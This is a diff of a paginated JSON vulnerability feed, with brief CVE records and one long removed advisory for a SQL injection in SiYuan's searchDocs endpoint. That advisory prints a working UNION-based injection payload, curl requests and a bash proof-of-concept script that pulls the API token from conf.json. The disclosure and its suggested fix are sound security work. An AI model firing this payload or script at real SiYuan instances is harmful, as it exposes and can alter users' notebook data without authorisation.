@@ -6,859 +6,893 @@
     "page": 44,
     "pageSize": 50,
     "totalPages": 288,
-    "totalItems": 14362,
+    "totalItems": 14367,
     "hasNextPage": true,
     "hasPrevPage": true
   },
   "cves": [
     {
-      "id": "CVE-2026-69085",
-      "summary": "### Summary\n\nThe `/api/filetree/searchDocs` endpoint concatenates the caller-supplied search keyword directly into a SQL statement with no escaping and no parameter binding. The endpoint is gated by `CheckAuth` only reachable by the publish RoleReader token, and by the anonymous account when `Publish.Auth.Enable` is `false`. The resulting statement runs on a read-write SQLite handle through a driver that executes stacked (`;`-separated) statements, against the global `blocks` table spanning all cleartext notebooks. An unauthenticated request can therefore read and write database content across every non-encrypted notebook on the instance.\n\n### Details\n\nData flow, unescaped and unbound at every hop:\n\n- `searchDocs` (`kernel/api/filetree.go`): `k := arg[\"k\"].(string)` passed straight to `model.SearchDocs(k, …)`, no sanitization.\n- `SearchDocs` (`kernel/model/file.go`): after `TrimSpace` and `strings.Fields`, each token is spliced into a single-quoted `LIKE` literal by concatenation `condition.WriteString(\"(hpath LIKE '%\" + k + \"%'\")`. No escaping, no `''` doubling, no bind placeholder.\n- `NAMFilter` (`kernel/conf/search.go`): appends `\" OR name LIKE '%\" + keyword + \"%'\"` (and `alias`, `memo`) the same way, enabled by default.\n- `QueryRootBlockByCondition` (`kernel/sql/block_query.go`): `\"SELECT *, … FROM blocks WHERE type = 'd' AND \" + condition + \" ORDER BY … LIMIT …\"` passed to `query(sqlStmt)`.\n\nThe only value-inspecting guard is `ast.IsNodeIDPattern(keyword)`, which merely routes an exact-ID-shaped keyword to a different branch; a normal keyword falls through to the concatenation. `strings.Fields` prevents literal whitespace within a token this constrains payload construction but is not sanitization or confinement.\n\n**Driver / statement stacking.** The driver is the vendored `github.com/88250/go-sqlite3` (mattn fork), registered as `sqlite3_extended`. `query()` calls `db.Query`, and the driver's connection `query` implementation loops over `;`-separated statements preparing and executing each in turn so a stacked statement executes for its side effects. SiYuan's `CheckSingleStatement` / `CheckReadonlyStatement` guards exist but are wired only into the explicit SQL endpoints (`api/sql.go`, `cli`, `mcp`); the `searchDocs > query()` path does not call them.\n\n**Handle.** The DSN (`kernel/model/database.go`) sets `_journal_mode=WAL&_synchronous=OFF&…` with no `mode=ro` and no `_query_only`. It is the same read-write handle used for indexing `Exec` calls, so stacked `INSERT`/`UPDATE`/`DELETE` execute, and `ATTACH` is available. `load_extension` is not enabled in this build (no build tag / ConnectHook enabling it), so the ceiling is database read/write, not code execution.\n\n**Scope.** The `blocks` table indexes every opened non-encrypted notebook. Encrypted notebooks use separate per-box databases and are excluded. Scope is therefore all cleartext notebook content on the instance cross-notebook, not publish-scoped.\n\n### Impact\n\nAn unauthenticated request (publish mode with auth disabled) or any publish RoleReader reaches an unescaped, unparameterized SQL concatenation on a read-write handle whose driver executes stacked statements, against a table spanning all cleartext notebooks. This permits cross-notebook disclosure of document content and, via statement stacking on the read-write handle, modification of database content (and `ATTACH`-reachable files). No admin role, no CSRF token, no write permission through the normal API is required; the publish surface alone is sufficient. Encrypted notebooks are not exposed. Code execution is not reachable in the default build (no `load_extension`).\n\n## Root cause\nThe keyword is split on whitespace and each token is spliced into a `LIKE` literal without escaping or binding:\n\n- `SearchDocs` builds each condition as `(hpath LIKE '%<token>%' ...)` (`file.go:199`).\n- `NAMFilter` appends `OR name LIKE '%<token>%'`, `alias`, `memo` the same way (`search.go:135-142`).\n- `QueryRootBlockByCondition` concatenates that condition into `SELECT *, length(hpath) - length(replace(hpath, '/', '')) AS lv FROM blocks WHERE type = 'd' AND <condition> ORDER BY box DESC, lv ASC LIMIT <n>` and calls `query()` (`block_query.go:74-75`).\n- `query()` calls `db.Query()` with **no** call to the project's own `CheckSingleStatement` / `CheckReadonlyStatement` guards, which are wired only into `api/sql.go` (the explicit SQL endpoints), not this path (`database.go:1426-1436`).\n\nThe only pre-sink check is `ast.IsNodeIDPattern` (`file.go:179`), which merely routes exact-ID-shaped input to a different (also concatenated) branch, it does not sanitize.\n\n## Reachability / auth tier\n- Route middleware is `model.CheckAuth` only **no** `CheckAdminRole`.\n- The publish reverse proxy injects a token resolving to `RoleReader`, or the anonymous account when `Publish.Auth.Enable=false`. Both satisfy `CheckAuth`. \n- The handler applies **no** publish-access / read-only / role check, and `SearchDocs` applies no post-query scope filter.\n- Query targets the global `blocks` table = all opened non-encrypted notebooks (cross-boundary). Encrypted notebooks use separate DBs and are excluded.\n\n## Proof of concept (read-only discloses `sqlite_version()`)\n\nDemonstrated against a **local** instance. Read-only: the PoC runs a single `SELECT … UNION SELECT` and surfaces the SQLite version string through the search response. No data is modified.\n\n### 1. Prerequisites\n- A local SiYuan kernel running (default `http://127.0.0.1:6806`).\n- The API token from **Settings > About > API token** (omit if no access-auth code is set).\n- One **opened** notebook id (17 chars), e.g. from `POST /api/notebook/lsNotebooks`.\n\n### 2. Why the payload is shaped this way\n- The kernel places the keyword as `hpath LIKE '%<K>%'`, so the payload closes the string literal and the condition group, appends a `UNION SELECT`, and comments out the trailing `%'`, `ORDER BY`, and `LIMIT`.\n- The keyword is whitespace-split (`strings.Fields`), so literal spaces are replaced with `/**/` SQL comments.\n- `blocks` has 21 columns; the query adds a computed `lv`, so the `UNION SELECT` must supply **22** values. Only **col 5 (Box)** and **col 6 (Path)** matter: col 5 must equal an opened notebook id (result loop skips rows whose box is not open `file.go:230`) and col 6 is returned verbatim as the response `path` field.\n\n## 3. PoC\n\n1. Open the web UI once (unlocks + ensures a notebook is open)\n\n1. Browser > `http://127.0.0.1:6806`\n2. Enter the access-auth code: `poctestcode`\n3. Let it finish loading. A fresh instance opens with a default notebook in the left sidebar that's what the PoC needs (the injection surfaces through an open notebook). If the sidebar is empty, click ＋ > New notebook, name it anything, and make sure it's open (bold, not greyed).\n\n2. Grab the API token\n\n```\ndocker exec siyuan-poc grep -o '\"token\":\"[^\"]*\"' /siyuan/workspace/conf/conf.json\nTOKEN=\"paste_the_token_value_here\"\n```\n\n3. Get the open notebook's ID\n\n`curl -s -X POST \"http://127.0.0.1:6806/api/notebook/lsNotebooks\" -H \"Authorization: Token $TOKEN\"`\nCopy an id whose \"closed\":false, then: `BOX_ID=\"paste_that_id_here\"`\n\n4. Build the request body\n\n```\ncat > body.json <<EOF\n{\"k\":\"poc%')/**/union/**/select/**/'poc','','poc','','$BOX_ID',sqlite_version(),'/POC','POC','','','','','','',0,'d','','',0,'','',0--\"}\nEOF\n```\n\n(The heredoc substitutes $BOX_ID for you, no manual editing.)\n\n5. Fire the injection\n\n`curl -s -X POST \"http://127.0.0.1:6806/api/filetree/searchDocs\" -H \"Content-Type: application/json\" -H \"Authorization: Token $TOKEN\" -d @body.json | grep -o '\"path\":\"[0-9][^\"]*\"'`\nExpected: the SQLite version string, e.g. `\"path\":\"3.45.1\"`, proof the keyword was executed as SQL. Screenshot this for the advisory.\n\n6. Confirm the row is genuinely injected (optional sanity check)\n\nRun the same request with a benign keyword and confirm no version appears:\n`curl -s -X POST \"http://127.0.0.1:6806/api/filetree/searchDocs\" -H \"Content-Type: application/json\" -H \"Authorization: Token $TOKEN\" -d '{\"k\":\"poc\"}' | grep -o '\"path\":\"[0-9][^\"]*\"'`   # returns nothing\nThe differential (version appears only with the crafted keyword) is clean evidence for the report.\n\nIf Step 5 returns empty:\n5. Fire the injection\n\n`curl -s -X POST \"http://127.0.0.1:6806/api/filetree/searchDocs\" -H \"Content-Type: application/json\" -H \"Authorization: Token $TOKEN\" -d @body.json | grep -o '\"path\":\"[0-9][^\"]*\"'`\nExpected: the SQLite version string, e.g. \"path\":\"3.45.1\", proof the keyword was executed as SQL. Screenshot this for the advisory.\n\n6. Confirm the row is genuinely injected (optional sanity check)\n\nRun the same request with a benign keyword and confirm no version appears:\n`curl -s -X POST \"http://127.0.0.1:6806/api/filetree/searchDocs\" -H \"Content-Type: application/json\" -H \"Authorization: Token $TOKEN\" -d '{\"k\":\"poc\"}' | grep -o '\"path\":\"[0-9][^\"]*\"'`   # returns nothing\n\nThe differential (version appears only with the crafted keyword) is clean evidence for the report.\n\nOr you can use this script to do the whole process at once:\n\n```\n#!/usr/bin/env bash\n#\n# siyuan_sqli_poc.sh\n# Read-only PoC: proves SQL injection in /api/filetree/searchDocs by disclosing\n# sqlite_version() through the search response. Modifies NO data.\n\nset -u\nexport MSYS_NO_PATHCONV=1   # stop Git Bash from mangling container-absolute paths\n\n# ---- config ---------------------------------------------------------------\nBASE=\"${BASE:-http://127.0.0.1:6806}\"\nCONTAINER=\"${CONTAINER:-siyuan-poc}\"\nCONF=\"/siyuan/workspace/conf/conf.json\"\n# ---------------------------------------------------------------------------\n\nCONF=\"/siyuan/workspace/conf/conf.json\"\n# ---------------------------------------------------------------------------\n\nsay()  { printf '\\n\\033[1m== %s\\033[0m\\n' \"$*\"; }\nok()   { printf '\\033[32m[OK]\\033[0m %s\\n' \"$*\"; }\nwarn() { printf '\\033[33m[!!]\\033[0m %s\\n' \"$*\"; }\ndie()  { printf '\\033[31m[XX]\\033[0m %s\\n' \"$*\"; exit 1; }\n\n# 1. container up?\nsay \"Checking container\"\ndocker ps --format '{{.Names}}' | grep -qx \"$CONTAINER\" \\\n  || die \"Container '$CONTAINER' is not running. Start it, then re-run.\"\nok \"container '$CONTAINER' is running\"\n\n# 2. API alive?\nsay \"Waiting for kernel API\"\nfor i in $(seq 1 30); do\n  if curl -sf \"$BASE/api/system/version\" >/dev/null 2>&1; then\n    ok \"API responding at $BASE\"; break\n  fi\n  sleep 1\n  [ \"$i\" = 30 ] && die \"API not responding. Open $BASE in a browser, enter the access code, then re-run.\"\ndone\n\n# 3. token from conf.json\nsay \"Reading API token\"\nTOKEN=$(docker exec \"$CONTAINER\" cat \"$CONF\" 2>/dev/null \\\n  | grep -oE '\"token\"[[:space:]]*:[[:space:]]*\"[^\"]*\"' | head -1 \\\n  | sed -E 's/.*:[[:space:]]*\"([^\"]*)\".*/\\1/')\nif [ -n \"$TOKEN\" ]; then\n  ok \"token found\"\n  AUTH=(-H \"Authorization: Token $TOKEN\")\nelse\n  warn \"no token in conf.json (instance may not be initialized, or auth is disabled).\"\n  warn \"  -> open $BASE, enter the access code, let the UI load, then re-run.\"\n  AUTH=()\nfi\n\n# 4. an OPEN notebook id\nsay \"Finding an open notebook\"\nNB=$(curl -s -X POST \"$BASE/api/notebook/lsNotebooks\" \"${AUTH[@]}\")\nBOX_ID=$(echo \"$NB\" | tr '}' '\\n' | grep '\"closed\":false' \\\n  | grep -oE '\"id\":\"[^\"]+\"' | head -1 | sed -E 's/\"id\":\"([^\"]+)\"/\\1/')\n[ -n \"$BOX_ID\" ] || die \"No OPEN notebook found. Open one in the UI ($BASE) and re-run.  Raw: $NB\"\nok \"using open notebook: $BOX_ID\"\n\n# 5. build the read-only payload (22-column UNION; col5=box, col6=sqlite_version())\nsay \"Building request body\"\nPAYLOAD=\"poc%')/**/union/**/select/**/'poc','','poc','','${BOX_ID}',sqlite_version(),'/POC','POC','','','','','','',0,'d','','',0,'','',0--\"\nprintf '{\"k\":\"%s\"}' \"$PAYLOAD\" > body.json\nok \"wrote body.json\"\n\n# 6. fire the injection\nsay \"Sending injection\"\nRESP=$(curl -s -X POST \"$BASE/api/filetree/searchDocs\" \\\n  -H \"Content-Type: application/json\" \"${AUTH[@]}\" -d @body.json)\nVER=$(echo \"$RESP\" | grep -oE '\"path\":\"[0-9][^\"]*\"' | head -1 | sed -E 's/\"path\":\"([^\"]*)\"/\\1/')\n\n# 7. benign differential (must NOT return a version)\nBENIGN=$(curl -s -X POST \"$BASE/api/filetree/searchDocs\" \\\n  -H \"Content-Type: application/json\" \"${AUTH[@]}\" -d '{\"k\":\"poc\"}' \\\n  | grep -oE '\"path\":\"[0-9][^\"]*\"' | head -1)\n\n# 8. verdict\nsay \"Result\"\nif [ -n \"$VER\" ] && [ -z \"$BENIGN\" ]; then\n  ok \"SQL injection CONFIRMED\"\n  printf '     leaked sqlite_version() = \\033[1m%s\\033[0m\\n' \"$VER\"\n  printf '     (benign keyword returned no version -> value came from injected SQL)\\n'\nelse\n  warn \"no version surfaced. Checking kernel log for the assembled statement...\"\n  docker exec \"$CONTAINER\" sh -c 'grep \"sql query\" /siyuan/workspace/temp/siyuan.log 2>/dev/null | tail -3' || true\n  warn \"If you see 'sql query [...] failed', it's a column-count mismatch on this build.\"\n  warn \"If no error line: the box filter dropped the row -> confirm BOX_ID is an OPEN notebook.\"\n  printf '     raw response: %s\\n' \"$RESP\"\nfi\n```\n`bash siyuan_sqli_poc.sh`\n\n<img width=\"809\" height=\"376\" alt=\"image\" src=\"https://github.com/user-attachments/assets/e7875c16-a18b-4acb-811e-7385184bf6d4\" />\n\n### Suggested fix\n\nParameterize the search. The load-bearing fix is at `SearchDocs` and `NAMFilter`: bind the keyword as a parameter rather than concatenating it, or at minimum escape `'` and the `LIKE` metacharacters and pass via a bound argument. Secondarily, route the `searchDocs > query()` path through the existing `CheckSingleStatement` / `CheckReadonlyStatement` guards so this and any similar internal query path cannot stack statements or write. Consider opening the query handle used by read paths with `_query_only=1`.",
-      "cvssScore": 10,
+      "id": "CVE-2026-43834",
+      "summary": "A stack-based buffer overflow vulnerability in the logs settings functionality could allow an authenticated attacker to achieve code execution.",
+      "cvssScore": null,
+      "severity": "High",
+      "published": "2026-10-20",
+      "modified": "2026-10-20",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-43834",
+        "https://www.advantech.com/en/security-advisory",
+        "https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-149"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-113406",
+      "summary": "BA-Workflow developed by YS-infoware has a SQL Injection vulnerability. Authenticated remote attackers can inject arbitrary SQL statements to read, modify, and delete database contents.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-10-20",
+      "modified": "2026-10-20",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-113406",
+        "https://www.twcert.org.tw/en/cp-139-11299-0cbfd-2.html",
+        "https://www.twcert.org.tw/tw/cp-132-11298-d9dd5-1.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-11960",
+      "summary": "Enumeration of unauthenticated users in FacturaScripts, version 2025.61. The application returns different responses when attempting to log in with a valid username compared to an invalid one. An unauthenticated attacker could systematically identify valid usernames by examining variations in the application’s responses, such as changes in response time, discrepancies between error messages or differences in HTTP status codes. A successful exploit allows the attacker to compile a list of valid user accounts. This list could be used to carry out targeted brute-force attacks, password spraying, credential stuffing or social engineering campaigns against the confirmed accounts.",
+      "cvssScore": null,
+      "severity": "Medium",
+      "published": "2026-10-20",
+      "modified": "2026-10-20",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-11960",
+        "https://www.incibe.es/en/incibe-cert/notices/aviso/multiple-vulnerabilities-facturascripts"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-77635",
+      "summary": "### Impact\nThe `FunctionsBuilder::jsonValue($field, $jsonPath)` methods with the Postgres driver is vulnerable to SQL injection if user controlled data is supplied to the `$jsonPath` parameter.\n\n### Patches\n5.1.10, 5.2.15, 5.3.7 \n\n### Workarounds\nDon't provide user controlled data to these functions/parameters.",
+      "cvssScore": 9.2,
       "severity": "Critical",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
       "cwe": {
         "cwe_id": "CWE-89",
         "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
       },
       "references": [
-        "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-33jq-p8c2-q3q4",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-69085",
-        "https://github.com/siyuan-note/siyuan/releases/tag/v3.7.3",
-        "https://www.vulncheck.com/advisories/siyuan-before-sql-injection-via-searchdocs",
-        "https://github.com/advisories/GHSA-33jq-p8c2-q3q4"
+        "https://github.com/cakephp/cakephp/security/advisories/GHSA-fxf7-vhh8-7vpq",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-77635",
+        "https://github.com/cakephp/cakephp/commit/138f2f61486532c29ee4d106da2a9848c1ff1ab3",
+        "https://github.com/cakephp/cakephp/commit/489a40fb7c6e597af33fe0f7264047afccb90d55",
+        "https://github.com/cakephp/cakephp/commit/9f1ad970a3b72293d4a37e694276645f804e819f"
       ],
       "vulnerableProducts": [
-        "github.com/siyuan-note/siyuan/kernel go"
+        "cakephp/cakephp composer",
+        "cakephp/database composer"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-27874",
-      "summary": ": Use of Hard-coded Credentials vulnerability in Johnson Controls EasyIO FS32 allows : Exploitation of Default or Hard-coded Credentials.\n\nThis issue affects EasyIO FS32: before 3.0b63.",
-      "cvssScore": null,
-      "severity": "Medium",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
+      "id": "CVE-2004-1718",
+      "summary": "The ZwOpenSection function in Integrity Protection Driver (IPD) 1.4 and earlier allows local users to cause a denial of service (crash) via an invalid pointer in the \"oa\" argument.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2004-08-17",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-27874",
-        "https://www.johnsoncontrols.com/trust-center/cybersecurity/security-advisories"
+        "http://marc.info/?l=bugtraq&m=109276749821133&w=2",
+        "http://secunia.com/advisories/12169",
+        "http://www.ngsec.com/docs/advisories/NGSEC-2004-6.txt",
+        "http://www.securityfocus.com/bid/10965",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17010"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-55395",
-      "summary": "Hardcoded passwords in the access control in Teledyne FLIR Aware2 versions through 6.9.0.2 (PackBot) and 1.7.9 (FirstLook) allows remote unauthenticated attackers to access and reconfigure Teledyne FLIR PackBot and FirstLook robots running this software via reading the passwords from the firmware or documentation.",
-      "cvssScore": null,
-      "severity": "Critical",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-55395",
-        "https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0031.md"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-82358",
-      "summary": "RT-Labs AB C-Open CANopen contains a write protection bypass in the SDO (Service Data Object) server implementation 'src/co_sdo_server.c' that fails to properly validate write permissions when processing download-segment frames. An unauthenticated attacker on the CAN bus can initiate an SDO upload for a read-only Object Dictionary (OD) entry, which sets a data pointer to the read-only object, then send download-segment frames to write to that memory location. The download-segment handler does not verify that a download session is active, allowing any CANopen node to overwrite read-only OD entries using two SDO frames. Note that CANopen protocol operates over CAN bus and does not provide built-in authentication mechanisms. Fixed in 1.1.1.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-82358",
-        "https://github.com/rtlabs-com/c-open/releases/tag/public%2Fv1.1.1",
-        "https://raw.githubusercontent.com/cisagov/CSAF/develop/csaf_files/IT/white/2025/va-26-275-02.json",
-        "https://rt-labs.com/wp-content/uploads/2026/09/RRTL-260929-01.pdf",
-        "https://www.cve.org/CVERecord?id=CVE-2026-82358"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-55396",
-      "summary": "Cleartext transmission without a cryptographic integrity check in operator control unit to robot UDP traffic in Teledyne FLIR Aware2 versions through 6.9.0.2 (PackBot) and 1.7.9 (FirstLook) allows adjacent unauthenticated attackers to intercept, hijack, or modify control traffic against Teledyne FLIR PackBot and FirstLook robots running this software via sniffing or hijacking network traffic.",
-      "cvssScore": null,
-      "severity": "High",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-55396",
-        "https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0032.md"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-71451",
-      "summary": "- OS Command Injection vulnerability in Johnson Controls EasyIO FS32 allows - Command Injection.\n\nThis issue affects EasyIO FS32: before 3.0b63.",
-      "cvssScore": null,
-      "severity": "High",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-71451",
-        "https://www.johnsoncontrols.com/trust-center/cybersecurity/security-advisories"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-93832",
-      "summary": "A component of one of the Motorola system applications was\nexported without permission, allowing for the revocation of runtime permissions\nfrom other apps.",
+      "id": "CVE-2004-1719",
+      "summary": "Multiple cross-site scripting (XSS) vulnerabilities in Merak Webmail Server 5.2.7 allow remote attackers to inject arbitrary web script or HTML via the (1) category, (2) cserver, (3) ext, (4) global, (5) showgroups, (6) or showlite parameters to address.html, or the (7) spage or (8) autoresponder parameters to settings.html, the (9) folder parameter to readmail.html, or the (10) attachmentpage_text_error parameter to attachment.html, (11) folder, (12) ct, or (13) cv parameters to calendar.html, (14) an <img> tag, or (15) the subject of an e-mail message.",
       "cvssScore": 4.3,
       "severity": "Medium",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
+      "published": "2004-08-17",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-93832",
-        "https://en-us.support.motorola.com/app/answers/detail/a_id/193638"
+        "http://marc.info/?l=bugtraq&m=109279057326044&w=2",
+        "http://packetstormsecurity.nl/0408-exploits/merak527.txt",
+        "http://secunia.com/advisories/12269",
+        "http://securitytracker.com/id?1010969",
+        "http://www.osvdb.org/9037"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-55394",
-      "summary": "Unencrypted traffic in the 802.11 network of Teledyne FLIR Aware2 versions through 6.9.0.2 allows adjacent unauthenticated attackers to intercept, hijack, or modify session traffic against Teledyne FLIR PackBot robots running this software via sniffing or hijacking network traffic.",
-      "cvssScore": null,
+      "id": "CVE-2004-1603",
+      "summary": "cPanel 9.4.1-RELEASE-64 follows hard links, which allows local users to (1) read arbitrary files via the backup feature or (2) chown arbitrary files via the .htaccess file when Front Page extensions are enabled or disabled.",
+      "cvssScore": 5.5,
       "severity": "Medium",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-55394",
-        "https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0030.md"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-102370",
-      "summary": "Kasa EC70 v4\nand EC71 v4 do not logically disable the production debug interface at the\nfirmware or chip level and do not lock the bootloader.  Although the debug traces are physically\nsevered during manufacturing, an attacker with physical access can restore the\nconnection, interrupt the boot process, and manipulate boot parameters to enter\na non-standard initialization path that exposes an unauthenticated root shell\nduring startup.\n\nSuccessful exploitation may allow an\nattacker with physical access to obtain root-level command access during device\nstartup, resulting in loss of confidentiality, integrity, and availability for\nthe affected device. Exploitation requires device disassembly, restoration of\nthe severed debug connection, and manipulation of the boot process.",
-      "cvssScore": null,
-      "severity": "Medium",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102370",
-        "https://www.tp-link.com/us/support/download/ec70/v4/#Firmware-Release-Notes",
-        "https://www.tp-link.com/us/support/download/ec71/v4/#Firmware-Release-Notes",
-        "https://www.tp-link.com/us/support/faq/5324"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-102514",
-      "summary": "Out-of-bounds Write (CWE-787) in the PEA archive extraction routine (pea.pas, unpea_procedure) of the first-party pea component in PeaZip 11.2.0 and earlier allows an attacker who convinces a victim to open or extract a crafted .pea archive to execute arbitrary code as the user running PeaZip. While decompressing a PCOMPRESS1 stream, the 32-bit compressed-block-size field of the first block (compsize) is read directly from the archive and used without validation as the length of a blockread into the fixed-size global buffers wbuf1/wbuf2 (1,114,112 bytes) and as the bound of the subsequent copy loop. The existing check \"compsize > WBUFSIZE\" is applied only to the size of each following block, so the first block escapes it; the same unvalidated value is also used to index wbuf1[compsize], an out-of-bounds read at an attacker-chosen offset. The copy loop additionally copies the requested length instead of the number of bytes actually read, and terminates on equality rather than on an upper bound. Because the project is built without range checking and no archive password, integrity tag or non-default configuration is required, the overflow overwrites adjacent global data; code execution was demonstrated by two independent researchers against the official Linux x86-64 and Windows x64 builds, and the denial-of-service and memory-corruption primitive is cross-platform (Windows, macOS, Linux, BSD).",
-      "cvssScore": null,
-      "severity": "High",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102514",
-        "https://github.com/peazip/PeaZip/commit/90ddbaee0945a4d8ffa4d972d43711bbfb9576ba",
-        "https://secur0.com/en/cna/cve-list/cve-2026-102514-out-of-bounds-write-in-peazip-pea-extractor"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-55393",
-      "summary": "Unvalidated pathnames in the web interface in Teledyne FLIR Aware2 versions through 6.9.0.2 (PackBot) and 1.7.9 (FirstLook) allows remote unauthenticated attackers to read configuration and security parameters on Teledyne FLIR PackBot and FirstLook robots running this software via path traversal.",
-      "cvssScore": null,
-      "severity": "Critical",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-55393",
-        "https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0029.md"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-102671",
-      "summary": "The Joyland AI app accepts invalid SSL certificates in the invisible advertisement WebView by default.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102671",
-        "https://raw.githubusercontent.com/cisagov/CSAF/develop/csaf_files/IT/white/2026/va-26-275-03.json",
-        "https://www.cve.org/CVERecord?id=CVE-2026-102671"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-14984",
-      "summary": "Cleartext transmission in the primary control endpoints of Teledyne FLIR Aware2 versions through 6.9.0.2 allows remote unauthenticated attackers to intercept, hijack, or modify session traffic against Teledyne FLIR PackBot robots running this software via sniffing or hijacking network traffic.",
-      "cvssScore": null,
-      "severity": "Critical",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-14984",
-        "https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0028.md"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-14983",
-      "summary": "Missing authentication in the web interface in Teledyne FLIR Aware2 versions through 6.9.0.2 allows remote unauthenticated attackers to achieve denial of service against Teledyne FLIR PackBot robots running this software via misuse of the reboot endpoint.",
-      "cvssScore": null,
-      "severity": "High",
-      "published": "2026-10-01",
-      "modified": "2026-10-01",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-14983",
-        "https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0027.md"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2065",
-      "summary": "WebCalendar 0.9.34 and earlier with 'browsing in includes directory' enabled allows remote attackers to read arbitrary include files with .inc extensions from the web root.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-12-31",
+      "published": "2004-10-18",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-59",
       "references": [
-        "http://sourceforge.net/project/shownotes.php?group_id=3870&release_id=93295",
-        "http://www.iss.net/security_center/static/9296.php",
-        "http://www.securityfocus.com/bid/4961",
-        "http://sourceforge.net/project/shownotes.php?group_id=3870&release_id=93295",
-        "http://www.iss.net/security_center/static/9296.php"
+        "http://marc.info/?l=bugtraq&m=109811572123753&w=2",
+        "http://marc.info/?l=bugtraq&m=109811654104208&w=2",
+        "http://secunia.com/advisories/12865",
+        "http://www.securityfocus.com/bid/11449",
+        "http://www.securityfocus.com/bid/11455"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-1243",
-      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: none.  Reason: This candidate was in a CNA pool that was not assigned to any issues during 2004.  Notes: none",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2234",
-      "summary": "NetScreen ScreenOS before 4.0.1 allows remote attackers to bypass the Malicious-URL blocking feature by splitting the URL into fragmented IP requests.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2002-12-31",
